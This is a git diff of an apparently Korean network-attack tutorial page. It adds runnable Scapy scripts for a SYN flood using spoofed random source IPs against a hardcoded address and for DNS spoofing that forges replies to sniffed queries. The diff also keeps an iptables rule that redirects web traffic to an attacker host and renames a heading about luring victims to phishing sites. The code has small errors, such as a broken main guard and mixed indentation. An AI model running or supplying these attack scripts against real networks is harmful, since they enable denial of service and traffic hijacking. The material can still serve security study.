@@ -127,7 +127,7 @@ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <공격
 ```
 
 ---
-### IP 스푸핑으로 피싱 사이트 유도하기
+### IP 스푸핑
 ---
 
 * **IP 스푸핑을 통해 수행되는 공격**
@@ -139,3 +139,63 @@ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <공격
 
 IP 주소를 위조하여 Ping을 보내보자.
 {: .notice}
+
+```
+from scapy.all import *
+from random import shuffle
+
+def getRandomIP():
+    ipfactors = [x for x in range(256)]
+    tmpip = []
+    for i in range(4):
+        shuffle(ipfactors)
+        tmpip.append(str(ipfactors[0]))
+    randomip = '.'.join(tmpip)
+    return randomip
+    
+def synAttack(targetip):
+    srcip = getRandomIP()
+    P_IP = IP(src=srcip, dst=targetip)
+    P_TCP = TCP(dport=range(1, 1024), flags='S')
+    packet = P_IP/P_TCP
+    srflood(packet, store=0)
+   
+def main():
+    targetip = '123.223.221.111'
+    synAttack(targetip)
+    
+if __name__ = '__main__':
+    main()
+```
+
+---
+### DNS 스푸핑
+---
+
+```
+from scapy.all import *
+
+def dnsSpoof(packet):
+	spoofDNS = '172.21.70.227'
+	dstip = packet[IP].src
+    srcip = packet[IP].dst
+    sport = packet[UDP].sport
+    dport = packet[UDP].dport
+    
+    if packet.haslayer(DNSQR):
+        dnsid = packet[DNS].id
+        qd = packet[DNS].qd
+        dnsrr = DNSRR(rrname=qd.qname, ttl=10, rdata=spoofDNS)
+        spoofPacket = IP(dst=dstip, src=srcip)/\
+        UDP(dport=sport, sport=dport)/DNS(id=dnsid, qd=qd, aa=1, qr=1, an=dnsrr)
+        send(spoofPacket)
+        print('+++ SOURCE[%s] -> DEST[%s]' %(dstip, srcip))
+        print(spoofPacket.summary())
+        
+def main():
+    print('+++DNS SPOOF START...')
+    sniff(filter='udp port 53', store=0, prn=dnsSpoof)
+    
+if __name__ == '__main__':
+    main()
+```
